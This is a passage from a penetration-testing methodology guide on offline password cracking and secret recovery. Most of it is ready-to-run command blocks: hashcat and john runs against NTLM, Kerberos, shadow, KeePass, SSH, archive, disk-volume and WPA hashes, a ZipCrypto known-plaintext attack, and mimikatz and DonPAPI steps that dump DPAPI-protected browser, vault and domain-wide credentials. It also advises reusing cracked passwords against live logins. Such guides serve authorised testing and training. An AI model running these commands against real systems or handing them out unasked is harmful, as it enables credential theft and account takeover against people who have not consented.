| SHA-256 crypt | `sha256crypt` | 7400 |
| MD5 crypt | `md5crypt` | 500 |
| bcrypt | `bcrypt` | 3200 |
| DCC2 / MSCache2 | `mscash2` | 2100 |
| Kerberoast | `krb5tgs` | 13100 |
| AS-REP | `krb5asrep` | 18200 |
| KeePass | `keepass` | 13400 |
| SSH Key | `ssh` | 22911/22921/22931 |
| PKZIP | `pkzip` | 17200 |
| MS Office | `office` | 9400-9600 |
| PDF | `pdf` | 10500/10600/10700 |
| yescrypt | `yescrypt` | — |

[↑ Top](#password-cracking-methodology)

---

## Phase 5: Cracking Strategies by Hash Type

**Goal:** Use the optimal attack strategy for each hash type encountered during engagements.

### 5.1 NTLM (Mode 1000)

```bash
# Fast hash — GPU shreds these. Try large wordlists + aggressive rules.

# Quick win: rockyou + best64
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Extended: rockyou + OneRule
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# Brute-force 1-8 chars (feasible on modern GPUs)
hashcat -m 1000 -a 3 ntlm_hashes.txt '?a?a?a?a?a?a?a?a' --increment --increment-min 1

# Common AD pattern: Season+Year+Special
hashcat -m 1000 -a 0 ntlm_hashes.txt seasonal_passwords.txt -r /usr/share/hashcat/rules/best64.rule

# Pass-the-hash instead of cracking (if only need access)
# See active-directory-methodology.md and windows-methodology.md
```

### 5.2 NetNTLMv2 (Mode 5600)

```bash
# Captured via Responder, ntlmrelayx, or MITM
# Medium-speed hash — rules are key

# Standard attack
hashcat -m 5600 -a 0 netntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Extended attack
hashcat -m 5600 -a 0 netntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# Targeted: cewl output + rules
hashcat -m 5600 -a 0 netntlmv2_hashes.txt cewl_wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Cannot pass-the-hash with NetNTLMv2 — must crack or relay
```

### 5.3 Kerberoast TGS-REP RC4 (Mode 13100)

> For extracting Kerberoast hashes (GetUserSPNs, Rubeus, targeted Kerberoasting), see [Active Directory methodology - Phase 3.1-3.2: Kerberoasting](active-directory-methodology.md#31-kerberoasting).

```bash
# Extracted via GetUserSPNs.py, Rubeus, or [BloodHound-guided targeting](bloodhound-guide.md)
# Medium-cost hash — wordlist + rules is the standard approach

# Standard
hashcat -m 13100 -a 0 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Extended
hashcat -m 13100 -a 0 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# Targeted: company keywords + rules
hashcat -m 13100 -a 0 tgs_hashes.txt company_passwords.txt -r /usr/share/hashcat/rules/best64.rule

# Hybrid: word + 4 digits
hashcat -m 13100 -a 6 tgs_hashes.txt /usr/share/wordlists/rockyou.txt '?d?d?d?d'
```

### 5.4 Kerberoast TGS-REP AES-256 (Mode 19700)

```bash
# Slower than RC4 — same strategies but expect longer run times
hashcat -m 19700 -a 0 tgs_aes_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### 5.5 AS-REP Roast (Mode 18200)

> For extracting AS-REP hashes (GetNPUsers), see [Active Directory methodology - Phase 1.4: AS-REP Roasting](active-directory-methodology.md#14-as-rep-roasting-pre-auth-disabled).

```bash
# Same strategy as Kerberoast — these are typically weak passwords

# Standard
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Extended
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
```

### 5.6 Kerberos 5 AES-256 Pre-Auth (Mode 19900)

```bash
# Very slow — use targeted wordlists first
hashcat -m 19900 -a 0 krb5_aes256_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 19900 -a 0 krb5_aes256_hashes.txt company_passwords.txt -r /usr/share/hashcat/rules/best64.rule
```

### 5.7 bcrypt (Mode 3200)

```bash
# VERY slow hash — even GPUs are slow. Use small, targeted wordlists.

# Small wordlist first
hashcat -m 3200 -a 0 bcrypt_hashes.txt /usr/share/seclists/Passwords/darkweb2017-top10000.txt

# Then with rules on small list
hashcat -m 3200 -a 0 bcrypt_hashes.txt /usr/share/seclists/Passwords/Common-Credentials/best1050.txt -r /usr/share/hashcat/rules/best64.rule

# rockyou WITHOUT rules (rules multiply time enormously)
hashcat -m 3200 -a 0 bcrypt_hashes.txt /usr/share/wordlists/rockyou.txt

# Do NOT use dive.rule or OneRule with rockyou on bcrypt — it will take weeks
```

### 5.8 MSCache2 / DCC2 (Mode 2100)

```bash
# Extremely slow — 10,000+ PBKDF2 iterations. Use only targeted wordlists.
# Dumped via secretsdump from registry hives

# Targeted attack
hashcat -m 2100 -a 0 dcc2_hashes.txt /usr/share/seclists/Passwords/darkweb2017-top10000.txt

# Small wordlist + best64
hashcat -m 2100 -a 0 dcc2_hashes.txt /usr/share/seclists/Passwords/Common-Credentials/best1050.txt -r /usr/share/hashcat/rules/best64.rule

# Company-specific keywords
hashcat -m 2100 -a 0 dcc2_hashes.txt company_passwords.txt -r /usr/share/hashcat/rules/best64.rule
```

### 5.9 KeePass (.kdbx)

```bash
# Extract hash
keepass2john Database.kdbx > keepass_hash.txt

# Clean for hashcat (remove filename prefix)
grep -oP '\$keepass\$.*' keepass_hash.txt > keepass_hashcat.txt

# Crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt

# Crack with hashcat (mode 13400) — slow hash
hashcat -m 13400 -a 0 keepass_hashcat.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13400 -a 0 keepass_hashcat.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# If keyfile is used in addition to password, extraction must include it
keepass2john -k keyfile.key Database.kdbx > keepass_hash.txt
```

### 5.10 SSH Private Keys

```bash
# Extract hash from passphrase-protected key
ssh2john id_rsa > ssh_hash.txt

# Crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
john --show ssh_hash.txt

# Crack with hashcat — identify correct mode from hash format
# $sshng$0$ = mode 22911, $sshng$6$ = mode 22921, $sshng$1$ or $sshng$3$ = mode 22931
hashcat -m 22911 -a 0 ssh_hash.txt /usr/share/wordlists/rockyou.txt
```

### 5.11 ZIP / RAR / 7z Archives

```bash
# ZIP
zip2john protected.zip > zip_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
# Hashcat: mode 17200 (compressed), 17210 (uncompressed)
hashcat -m 17200 -a 0 zip_hashcat.txt /usr/share/wordlists/rockyou.txt

# RAR
rar2john protected.rar > rar_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt
# Hashcat: mode 12500 (RAR3), 13000 (RAR5)
hashcat -m 13000 -a 0 rar_hashcat.txt /usr/share/wordlists/rockyou.txt

# 7-Zip
7z2john protected.7z > 7z_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt 7z_hash.txt
# Hashcat: mode 11600
hashcat -m 11600 -a 0 7z_hashcat.txt /usr/share/wordlists/rockyou.txt
```

### 5.11b ZipCrypto Known-Plaintext Attack (bkcrack / PkCrack)

When a ZIP uses legacy ZipCrypto encryption (not AES-256), you can recover the internal encryption keys without brute-forcing the password if you possess at least 12 bytes of known plaintext from any file inside the archive. This bypasses password complexity entirely -- the attack recovers three 32-bit internal keys and uses them to decrypt all entries in the archive.

```bash
# === STEP 0: Identify ZipCrypto encryption (prerequisite check) ===
# ZipCrypto = "ZipCrypto Deflate" or "ZipCrypto Store" in Method column
# AES-256 = NOT vulnerable to this attack
7z l -slt <ARCHIVE>.zip | grep -E 'Method|Path|Size|CRC'

# Alternative: unzip -Z shows "Stra" (standard / traditional encryption = ZipCrypto)
unzip -Z -v <ARCHIVE>.zip | grep -E 'file security|compression method'
```

#### bkcrack (preferred — faster, actively maintained)

```bash
# === STEP 1: Identify a file inside the ZIP whose content you can guess ===
# Good candidates:
#   - PNG files (first 16 bytes are always the same PNG header)
#   - XML files in DOCX/XLSX (predictable <?xml ... ?> header)
#   - Known config files, default index.html, README boilerplate
#   - Any file you already have an unencrypted copy of

# List archive contents with CRC to match against known plaintext
bkcrack -L <ARCHIVE>.zip

# === STEP 2: Prepare known plaintext ===
# Option A: you have the full unencrypted file (or partial match >= 12 bytes)
# Compress it with the SAME method (Store or Deflate) into a reference ZIP
zip -0 plain.zip <KNOWN_FILE>    # -0 = Store (no compression)
zip plain.zip <KNOWN_FILE>       # default Deflate

# Option B: known header bytes only (e.g., PNG magic + IHDR)
printf '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52' > plain.bin

# === STEP 3: Recover internal keys (main cryptanalytic step) ===
# -C = encrypted archive, -c = target entry inside it
# -P = plaintext ZIP (option A), -p = plaintext entry inside it
bkcrack -C <ARCHIVE>.zip -c <ENCRYPTED_ENTRY> -P plain.zip -p <KNOWN_FILE>

# Using raw plaintext bytes (option B) with offset if header is not at byte 0
bkcrack -C <ARCHIVE>.zip -c <ENCRYPTED_ENTRY> -p plain.bin -o <OFFSET>

# === STEP 4: Decrypt with recovered keys ===
# -k = the three 32-bit keys from step 3 (printed as hex by bkcrack)
bkcrack -C <ARCHIVE>.zip -k <KEY0> <KEY1> <KEY2> -D decrypted.zip

# Alternatively, change the password to one you control
bkcrack -C <ARCHIVE>.zip -k <KEY0> <KEY1> <KEY2> -U unlocked.zip <NEW_PASSWORD>

# === STEP 5: Extract ===
unzip decrypted.zip
# or
unzip -P <NEW_PASSWORD> unlocked.zip
```

#### PkCrack (legacy alternative)

```bash
# PkCrack requires the plaintext compressed into a ZIP with the same method.
# The encrypted ZIP must use ZipCrypto (same prerequisite as bkcrack).

# 1. Create plaintext ZIP with matching compression
zip -0 plain.zip <KNOWN_FILE>    # Store
zip plain.zip <KNOWN_FILE>       # Deflate (match the encrypted entry's method)

# 2. Run the attack — extract_file = entry name inside the encrypted ZIP
pkcrack -C <ARCHIVE>.zip -c <ENCRYPTED_ENTRY> -P plain.zip -p <KNOWN_FILE> -d decrypted.zip

# 3. Extract result
unzip decrypted.zip

# CRC verification — confirm your plaintext matches before a long run
crc32 <KNOWN_FILE>
7z l -slt <ARCHIVE>.zip | grep CRC
# CRC of your plaintext MUST match the CRC shown for that entry in the archive
```

#### Identifying good known-plaintext candidates

```bash
# PNG header (first 16 bytes — always identical across all PNGs)
printf '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52' > png_header.bin

# DOCX/XLSX/PPTX — these are ZIPs containing [Content_Types].xml
# The XML declaration is always: <?xml version="1.0" encoding="UTF-8"?>
printf '<?xml version="1.0" encoding="UTF-8"?>' > xml_header.txt

# PK header for nested ZIPs (ZIP inside ZIP): first 4 bytes always PK\x03\x04
printf '\x50\x4b\x03\x04' > pk_header.bin

# ELF binary header (if a compiled binary is inside the archive)
printf '\x7fELF' > elf_header.bin

# Java class file magic (if .class files are archived)
printf '\xca\xfe\xba\xbe' > class_header.bin
```

#### Living-off-the-land / LOTL variant

No pure built-in OS tool can perform the ZipCrypto known-plaintext cryptanalysis (it requires implementing Biham-Kocher's algorithm). The closest native approach:

```bash
# Verify encryption type without bkcrack/pkcrack installed
# If "ZipCrypto" or "Traditional PKWARE" appears, the archive is vulnerable
7z l -slt <ARCHIVE>.zip | grep Method
unzip -Z -v <ARCHIVE>.zip 2>&1 | grep -i 'file security'
file <ARCHIVE>.zip

# CRC pre-check with native tools — confirm plaintext matches before acquiring bkcrack
python3 -c "
import binascii, sys
with open(sys.argv[1], 'rb') as f:
    data = f.read()
print(format(binascii.crc32(data) & 0xFFFFFFFF, '08x'))
" <KNOWN_FILE>
# Compare against: unzip -Z -v <ARCHIVE>.zip | grep CRC

# If Python3 is available but bkcrack is not, a minimal implementation:
# (copies the bkcrack algorithm in pure Python — slow but works offline)
python3 -c "
import struct, sys, zipfile

def update_keys(keys, b):
    keys[0] = crc32(keys[0], b)
    keys[1] = (keys[1] + (keys[0] & 0xFF)) & 0xFFFFFFFF
    keys[1] = ((keys[1] * 134775813) + 1) & 0xFFFFFFFF
    keys[2] = crc32(keys[2], (keys[1] >> 24) & 0xFF)
    return keys

def crc32(crc, b):
    return CRC_TABLE[(crc ^ b) & 0xFF] ^ (crc >> 8)

CRC_TABLE = []
for i in range(256):
    c = i
    for _ in range(8):
        c = (0xEDB88320 ^ (c >> 1)) if (c & 1) else (c >> 1)
    CRC_TABLE.append(c)

# This is the decryption half only — requires keys already recovered
# For the full attack, bkcrack is needed (Biham-Kocher is ~500 lines)
print('ZipCrypto LOTL: use bkcrack binary (pre-compiled, no install needed)')
print('Download is a single static binary — no pip/apt required')
"

# Pragmatic LOTL: bkcrack ships as a single static binary with no dependencies.
# Transfer it to the operator box via SCP/HTTP from your engagement toolkit.
# No package manager, no pip, no compilation needed.
# On the target (if you must run there): just drop the single binary.
```

### 5.12 PDF / Office Documents

```bash
# PDF
pdf2john protected.pdf > pdf_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt
# Hashcat: 10500 (PDF 1.4-1.6), 10600 (1.7 L3), 10700 (1.7 L8)

# MS Office
office2john protected.docx > office_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt office_hash.txt
# Hashcat: 9400 (Office 2007), 9500 (Office 2010), 9600 (Office 2013+)
```

### 5.13 Database Hashes

```bash
# MSSQL (2012+) — mode 1731
hashcat -m 1731 -a 0 mssql_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# MySQL 4.1+ — mode 300
# Strip the * prefix from the hash
hashcat -m 300 -a 0 mysql_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# PostgreSQL MD5 — mode 12 (raw) or use john
# Hash format: md5<32hex> where hash = MD5(password + username)
john --format=dynamic_1 --wordlist=/usr/share/wordlists/rockyou.txt pg_hash.txt
```

### 5.14 Linux Shadow File (/etc/shadow)

```bash
# Identify hash type from prefix
# $1$  = MD5 crypt (mode 500)
# $5$  = SHA-256 crypt (mode 7400)
# $6$  = SHA-512 crypt (mode 1800) — most common
# $y$  = yescrypt — john only (no hashcat support)

# Extract hashes from shadow file
# Format expected: user:$6$salt$hash
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# SHA-512 crypt — hashcat
hashcat -m 1800 -a 0 shadow_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# SHA-512 crypt — john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt shadow_hashes.txt

# yescrypt — john only
john --wordlist=/usr/share/wordlists/rockyou.txt --format=yescrypt shadow_hashes.txt

# MD5 crypt — mode 500
hashcat -m 500 -a 0 md5crypt_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### 5.15 DPAPI Master Key + Blob Cracking

> Windows DPAPI protects user secrets (browser creds, RDP passwords, WiFi keys, certificates). Master keys live at `%APPDATA%\Microsoft\Protect\<SID>\<GUID>` (user) and `%SYSTEMROOT%\System32\Microsoft\Protect\S-1-5-18\` (system). For exfil from a compromised host, see [Windows methodology](windows-methodology.md).

```bash
# === Files needed (exfil from target) ===
# 1. Master key file:   %APPDATA%\Microsoft\Protect\<SID>\<GUID>
# 2. User SID:          whoami /user  (or from registry)
# 3. User password OR NT hash
# 4. Encrypted blob:    %APPDATA%\Microsoft\Credentials\<GUID>  (creds)
#                       %APPDATA%\Microsoft\Vault\<GUID>         (vault)
#                       %LOCALAPPDATA%\Google\Chrome\...\Login Data  (browser)

# === Online (host-resident) decryption with mimikatz ===
# Decrypt master key using known user password
mimikatz # dpapi::masterkey /in:"C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>" /sid:<SID> /password:<PASSWORD>

# Decrypt master key using NT hash (no plaintext password needed)
mimikatz # dpapi::masterkey /in:"<MK_FILE>" /sid:<SID> /rpc
mimikatz # dpapi::masterkey /in:"<MK_FILE>" /sid:<SID> /hash:<NT_HASH>

# Decrypt master key as DA via domain backup key (DCsync the backup key first)
mimikatz # lsadump::backupkeys /system:<DC_FQDN> /export
mimikatz # dpapi::masterkey /in:"<MK_FILE>" /pvk:ntds_capi_0_<GUID>.pvk

# Decrypt credential blob with recovered master key
mimikatz # dpapi::cred /in:"C:\Users\<USER>\AppData\Local\Microsoft\Credentials\<GUID>" /masterkey:<DECRYPTED_MK>

# Decrypt vault entries
mimikatz # vault::cred /patch
mimikatz # vault::list

# Decrypt Chrome / Edge / Brave Login Data (current-user context)
mimikatz # dpapi::chrome /in:"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect

# === Offline cracking — chosen-plaintext attack on master key ===
# When you have the master key file but NO user password / hash → crack it.

# DPAPI masterkey v1 ($DPAPImk$1*) — mode 15300 (local ctx) / 15310 (context 3)
hashcat -m 15300 dpapi_mk_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# DPAPI masterkey v2 ($DPAPImk$2*, AD domain context) — mode 15900 (or 15910 ctx 3)
hashcat -m 15900 dpapi_mk_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Hash format examples (extract via DPAPImk2john or DonPAPI):
# $DPAPImk$1*1*S-1-5-21-...*aes256*sha512*8000*<IV>*<MK_BLOB>          (v1 → 15300)
# $DPAPImk$2*1*S-1-5-21-...*aes256*sha512*8000*<IV>*<MK_BLOB>          (v2 → 15900)

# DPAPImk2john — extract hashcat-compatible hash from raw master key file
python3 /opt/john/run/DPAPImk2john.py --sid=<SID> --masterkey=<MK_FILE> --context=domain  > dpapi_mk_hash.txt
python3 /opt/john/run/DPAPImk2john.py --sid=<SID> --masterkey=<MK_FILE> --context=local   > dpapi_mk_hash.txt

# === DonPAPI — orchestrated remote dump + offline decrypt (Linux operator box) ===
# Pulls master keys, creds, vaults, browsers, RDP, WiFi from one or many hosts.
pipx install donpapi
donpapi collect -t <TARGET_IP> -u <USER> -p <PASSWORD> -d <DOMAIN>
donpapi collect -t <TARGET_IP> -u <USER> -H <NT_HASH> -d <DOMAIN>
donpapi collect -t targets.txt -u <USER> -p <PASSWORD> -d <DOMAIN> --no-vnc --no-recent

# DonPAPI as DA with backup key (decrypts ANY user's secrets domain-wide)
donpapi collect -t <TARGET_IP> -u <DA_USER> -p <DA_PASSWORD> -d <DOMAIN> --pvk backup_key.pvk

# Output stored in ~/.donpapi/<DB>/loot — review with:
donpapi search -t <TARGET_IP>
```

### 5.16 VeraCrypt / TrueCrypt / LUKS / BitLocker Volume Crackers

> All slow KDFs — start with small targeted wordlists. Rockyou + OneRule on these takes days, not minutes.
>
> KeePass / PDF / Office cracking lives in §5.9, §5.11, §5.12 above (and extraction one-liners in §4.2).

```bash
# === VeraCrypt (header dumped via `dd if=<CONTAINER> bs=512 count=1 of=header.bin`,
#     or whole-disk encrypted partition — first 512 bytes of partition) ===
# Identify cipher/hash combo by trying each mode (or use `veracrypt --test`).

# VeraCrypt boot mode — modes 13721 / 13731 / 13741 (SHA-512 / Whirlpool / RIPEMD-160 + AES)
hashcat -m 13721 veracrypt_header.bin /usr/share/wordlists/rockyou.txt
hashcat -m 13731 veracrypt_header.bin /usr/share/wordlists/rockyou.txt
hashcat -m 13741 veracrypt_header.bin /usr/share/wordlists/rockyou.txt

# VeraCrypt non-boot — see `hashcat --help | grep -i veracrypt` for full list
# 13711 (SHA-512 + AES), 13712 (SHA-512 + Serpent), 13713 (SHA-512 + Twofish), etc.
hashcat -m 13711 veracrypt_header.bin /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# VeraCrypt with PIM (Personal Iteration Multiplier) — pass with --veracrypt-pim
hashcat -m 13711 veracrypt_header.bin rockyou.txt --veracrypt-pim=485

# VeraCrypt with keyfile
hashcat -m 13711 veracrypt_header.bin rockyou.txt --veracrypt-keyfiles=keyfile.bin

# === TrueCrypt — modes 6211 / 6221 / 6231 (boot + non-boot variants) ===
hashcat -m 6211 truecrypt_header.bin /usr/share/wordlists/rockyou.txt
hashcat -m 6221 truecrypt_header.bin /usr/share/wordlists/rockyou.txt
hashcat -m 6231 truecrypt_header.bin /usr/share/wordlists/rockyou.txt

# === LUKS1 — mode 14600 ===
# Dump the header + identify type
cryptsetup luksDump /dev/sdb1
cryptsetup luksHeaderBackup /dev/sdb1 --header-backup-file luks_header.bin
# Convert header → hashcat input via luks2hashcat (or feed header directly per algo)
hashcat -m 14600 luks_header.bin /usr/share/wordlists/rockyou.txt

# === LUKS2 — mode 29541 (Argon2id) and friends (29511-29543) ===
# LUKS2 uses Argon2 — extremely slow even for short wordlists.
cryptsetup luksDump /dev/sdb1                                # confirm LUKS2 + KDF=argon2id
cryptsetup luksHeaderBackup /dev/sdb1 --header-backup-file luks2_header.bin
hashcat -m 29541 luks2_header.bin /usr/share/seclists/Passwords/Common-Credentials/best1050.txt
# Other LUKS2 modes by cipher/hash:
# 29511 SHA-1+AES, 29512 SHA-1+Serpent, 29513 SHA-1+Twofish
# 29521 SHA-256+AES, 29522 SHA-256+Serpent, 29523 SHA-256+Twofish
# 29531 SHA-512+AES, 29532 SHA-512+Serpent, 29533 SHA-512+Twofish
# 29541 RIPEMD-160+AES, 29542 RIPEMD-160+Serpent, 29543 RIPEMD-160+Twofish

# === BitLocker — mode 22100 ===
bitlocker2john -i /dev/sdb1 > bitlocker_hash.txt
# Output may include multiple hash variants ($bitlocker$0$, $bitlocker$1$, $bitlocker$2$, $bitlocker$3$)
hashcat -m 22100 bitlocker_hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 22100 bitlocker_hash.txt /usr/share/seclists/Passwords/darkweb2017-top10000.txt -r /usr/share/hashcat/rules/best64.rule
```

### 5.17 WPA/WPA2 4-Way Handshake (.cap) — Mode 22000 / 2500

> **Context:** `.cap` / `.pcap` / `.pcapng` recovered on disk during host enumeration. PSK is min 8 chars — prune wordlists for speed.

```bash
# Inspect capture — confirm a 4-way handshake was actually captured
aircrack-ng <CAP_FILE>.cap
# Look for "WPA (1 handshake)" next to the target BSSID

# Path A — aircrack-ng dictionary attack (CPU, no conversion needed)
aircrack-ng -a 2 -b <BSSID> -w /usr/share/wordlists/rockyou.txt <CAP_FILE>.cap
# -a 2  WPA-PSK
# -b    target BSSID (omit if only one network in capture)

# Path B — convert to hashcat 22000 (modern PMKID+EAPOL combined) and GPU-crack
# https://github.com/ZerBea/hcxtools
hcxpcapngtool -o <CAP_FILE>.22000 <CAP_FILE>.cap
hashcat -m 22000 -a 0 <CAP_FILE>.22000 /usr/share/wordlists/rockyou.txt
# With rules
hashcat -m 22000 -a 0 <CAP_FILE>.22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Path C — legacy hccapx for older hashcat (mode 2500)
cap2hccapx <CAP_FILE>.cap <CAP_FILE>.hccapx
hashcat -m 2500 -a 0 <CAP_FILE>.hccapx /usr/share/wordlists/rockyou.txt

# Show cracked PSK without re-running
aircrack-ng -a 2 -b <BSSID> -w /usr/share/wordlists/rockyou.txt <CAP_FILE>.cap | grep 'KEY FOUND'
hashcat -m 22000 <CAP_FILE>.22000 --show

# Prune wordlist to valid WPA PSK length (8-63 chars) — big speedup
awk 'length($0) >= 8 && length($0) <= 63' /usr/share/wordlists/rockyou.txt > rockyou-wpa.txt
```

> **Tip:** Pivot the cracked PSK as a credential candidate against in-scope SSH/RDP/web logins owned by the SSID owner — Wi-Fi PSKs are routinely reused.

### 5.18 OpenSSL Salted-Format Encrypted Blobs

`openssl enc` output starts with the 8-byte magic `Salted__` + 8-byte salt + ciphertext. Cipher and KDF aren't recorded in the file — recover them by length-matching, then dictionary-attack.

```bash
# Format ref: http://justsolve.archiveteam.org/wiki/OpenSSL_salted_format
# Layout: "Salted__" (8 bytes) | salt (8 bytes) | ciphertext

# 1. If the blob is base64-armored, decode it first
base64 -d < <FILE>.enc.b64 > <FILE>.enc

# 2. Confirm the magic header — first 8 bytes must be 'Salted__'
xxd <FILE>.enc | head -1
# 53 61 6c 74 65 64 5f 5f  ...                  Salted__

# 3. Total length narrows the cipher family
#    divisible by 16 -> AES / ARIA / Camellia (16-byte block)
#    divisible by 8 only -> DES / 3DES / Blowfish / RC2 (8-byte block)
#    no padding constraint -> stream cipher (RC4)
wc -c <FILE>.enc
```

#### Cipher identification by length-matching

Encrypt plaintexts of every block-aligned length with each candidate cipher; only ciphers whose output exactly matches the target file size remain candidates.

```bash
ciphertext_size=$(wc -c < <FILE>.enc)

cat > cipher.lst <<'EOF'
-aes-256-cbc
-aes-128-cbc
-aes-256-ecb
-aes-128-ecb
-aes-256-ofb
-aes-128-ofb
-aes-256-cfb
-aes-128-cfb
-aria-128-cbc
-aria-256-cbc
-camellia-256-cbc
-camellia-128-cbc
-des-ede3-cbc
-des-cbc
-bf-cbc
-rc4
EOF

mkdir cipher_id && cd cipher_id
# Plaintexts of every 8-byte-aligned length up to the ciphertext size
for i in $(seq 0 8 $ciphertext_size); do
  python3 -c "import sys; sys.stdout.buffer.write(b'A'*$i)" > pt_$i
done

# Encrypt every plaintext with every candidate cipher (any throwaway key)
for cipher in $(cat ../cipher.lst); do
  for pt in pt_*; do
    openssl enc $cipher -e -in $pt -out ${pt}${cipher}.enc -k throwaway 2>/dev/null
  done
done

# Keep only encryptions whose size matches the target — those ciphers are candidates
wc -c *.enc | awk -v t="$ciphertext_size" '$1==t {print $2}' \
  | sed 's/^pt_[0-9]*//; s/\.enc$//' | sort -u
```

#### Dictionary attack — bruteforce-salted-openssl

```bash
# https://github.com/glv2/bruteforce-salted-openssl
# Try modern KDF first (sha256), then legacy default (md5)
bruteforce-salted-openssl -t 4 -f /usr/share/wordlists/rockyou.txt \
  -c <CIPHER> -d sha256 <FILE>.enc

bruteforce-salted-openssl -t 4 -f /usr/share/wordlists/rockyou.txt \
  -c <CIPHER> -d md5    <FILE>.enc
```

#### Decrypt with the recovered passphrase

```bash
# Try both KDFs — older openssl defaults to MD5, newer to SHA-256
openssl enc -<CIPHER> -d -in <FILE>.enc -out <FILE>.txt -k <PASSWORD>
openssl enc -<CIPHER> -d -md sha256 -in <FILE>.enc -out <FILE>.txt -k <PASSWORD>
```

#### Living-off-the-land alternative — pure-bash candidate filter

When `bruteforce-salted-openssl` isn't available on the operator box.

```bash
# Loop rockyou through openssl; print first password whose decrypt yields printable strings
for pw in $(cat /usr/share/wordlists/rockyou.txt); do
  out=$(openssl enc -<CIPHER> -d -in <FILE>.enc -k "$pw" -md sha256 2>/dev/null \
        | strings -n 4 | head -1)
  [ -n "$out" ] && echo "HIT: $pw -> $out" && break
done
```

> **Tip:** No magic header? It's not openssl-enc output. Try `file <FILE>.enc` and pivot to GPG (`gpg2john`), age, or app-specific format crackers in §4.2.

[↑ Top](#password-cracking-methodology)

---

## Phase 6: Online Attacks (Brute-Force / Spraying)

This file is for **offline** hash cracking. Online attacks (live brute-force / password spraying against a service) belong in [login-brute-forcing.md](login-brute-forcing.md):

- [Phase 0: Pre-Flight Checks (password policy + lockout awareness)](login-brute-forcing.md#phase-0-pre-flight-checks)
- [Phase 2: Hydra — Full Protocol Reference](login-brute-forcing.md#phase-2-hydra--full-protocol-reference)
- [Phase 6: NetExec (nxc) — Windows Spray](login-brute-forcing.md#phase-6-netexec-nxc--windows-spray)
- [Phase 7: Kerberos-Specific Spraying (kerbrute)](login-brute-forcing.md#phase-7-kerberos-specific-spraying)
- [Phase 10: Detection & Lockout Avoidance](login-brute-forcing.md#phase-10-detection--lockout-avoidance)

After cracking offline hashes here, take the recovered cleartext credentials there for live spraying — and respect lockout thresholds first (`netexec smb <DC_IP> -u <USER> -p <PASSWORD> --pass-pol`).

[↑ Top](#password-cracking-methodology)

---

## Phase 7: Cryptographic Recovery (Non-Hash)

Recover plaintext from broken or leaked asymmetric crypto. Distinct from Phases 1-6 (those crack the *key*; this recovers the *message* directly using leaked parameters or weak math). Common in CPTS-style boxes that drop a `.sage` / `encrypt.py` script alongside `output.txt` / `debug.txt` on the foothold.

### 7.1 Loot Triage — Find RSA Artifacts on a Foothold

```bash
# Look for RSA artifacts in user homes / web roots / cron output
find / -type f \( -name '*.sage' -o -name 'encrypt*' -o -name 'output.txt' \
                -o -name 'debug.txt' -o -name 'params*' -o -name 'flag.enc' \
                -o -name '*.pub' -o -name '*.pem' \) 2>/dev/null

# Cron / systemd jobs that re-encrypt with the same params each run
grep -rE 'sage|encrypt|openssl rsa' /etc/cron* /etc/systemd 2>/dev/null

# Read a captured PEM public key — extract N and E
openssl rsa -pubin -in <PUBKEY_PEM> -text -noout
```

> **Tip:** the `.sage + output.txt + debug.txt` triple is the giveaway. Pull P, Q, E from `debug.txt`, ciphertext from `output.txt`, run 7.2. If only N is given, jump to 7.3.

### 7.2 Textbook RSA Decrypt — P, Q, E, Ciphertext Known

```python
# https://crypto.stackexchange.com/a/19530
# pip install pycryptodome
from Crypto.Util.number import inverse, long_to_bytes

P = <P>
Q = <Q>
E = <E>
C = <CIPHERTEXT>   # decimal integer

N   = P * Q
phi = (P - 1) * (Q - 1)
D   = inverse(E, phi)
M   = pow(C, D, N)

print(f'n   = {N}')
print(f'd   = {D}')
print(f'pt  = {M}')
